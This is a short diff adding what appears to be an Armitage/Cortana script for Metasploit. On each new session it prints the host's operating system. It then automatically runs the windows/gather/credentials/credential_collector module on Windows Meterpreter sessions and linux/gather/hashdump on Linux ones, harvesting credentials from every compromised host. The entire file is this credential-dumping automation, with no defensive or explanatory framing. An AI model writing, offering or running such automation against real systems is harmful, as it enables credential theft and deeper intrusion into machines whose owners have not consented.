@@ -1,0 +1,15 @@
+on session_sync {
+	$host = session_host($1);
+
+	println(host_os(session_host($1)));
+        if (-iswinmeterpreter $1) {
+		println("Dumping windows credentials from $host");
+		post("windows/gather/credentials/credential_collector", $1);
+        }
+	
+	if(host_os(session_host($1)) eq 'linux') {
+		println("Dumping linux credentials from $host");
+		post("linux/gather/hashdump", $1);
+		
+	}
+}
